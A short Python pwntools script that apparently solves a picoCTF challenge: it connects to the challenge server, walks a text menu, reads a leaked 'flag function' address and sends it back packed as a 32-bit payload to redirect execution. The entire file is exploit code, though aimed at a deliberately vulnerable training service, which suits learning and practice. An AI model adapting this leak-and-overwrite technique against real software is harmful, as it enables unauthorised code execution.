from pwn import *


r = remote('mercury.picoctf.net', 6312)

print('\n\n')
r.recvuntil(b'(e)xit\n')
r.sendline(b'S')
r.recvuntil(b'leak...')
exploit_add = r.recvuntil(b'\n').decode()
print("flag function address: " + exploit_add)
r.recvuntil(b'(e)xit\n')
r.sendline(b'I')
r.recvuntil(b'?\n')
r.sendline(b'Y')
r.recvuntil(b'(e)xit\n')
r.sendline(b'L')
r.recvuntil(b'try anyways:\n')

payload = p32(int(exploit_add, 16), endian = 'little') + p32(0)
print(f'sending payload: {payload}')
r.sendline(payload)

x = r.recvuntil(b'\n').decode()
print(x)
print('\n\n')
